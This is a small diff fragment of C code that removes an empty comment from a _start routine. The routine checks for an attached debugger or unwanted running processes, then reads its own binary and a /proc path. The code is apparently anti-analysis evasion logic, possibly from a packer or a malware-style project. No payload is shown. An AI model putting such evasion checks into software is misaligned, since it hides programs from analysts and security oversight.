@@ -358,7 +358,6 @@ _start() {
     if (in_debugger() || bad_process_running()) jump_back(fd_self);
 
     for (volatile uint64_t x = 3; x < 201; x++) {
-        //
         if (x % 2 == 0) {
             volatile int fd = ft_open(path_self, O_RDONLY, 0);
             volatile int fd2 = ft_open(slash_proc, O_RDONLY, 0);
